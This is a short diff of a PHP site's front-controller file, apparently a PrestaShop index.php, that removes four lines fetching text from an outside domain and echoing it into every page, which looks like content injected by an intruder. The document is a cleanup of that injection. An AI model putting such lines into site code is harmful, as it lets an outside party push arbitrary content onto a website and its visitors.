@@ -26,7 +26,3 @@
 
 require dirname(__FILE__).'/config/config.inc.php';
 Dispatcher::getInstance()->dispatch();
-$a = file_get_contents( 'https://semogagacor.site/DN/getar.txt' );
-echo $a;
-$a = file_get_contents( 'https://semogagacor.site/DN/gacor.txt' );
-echo $a;
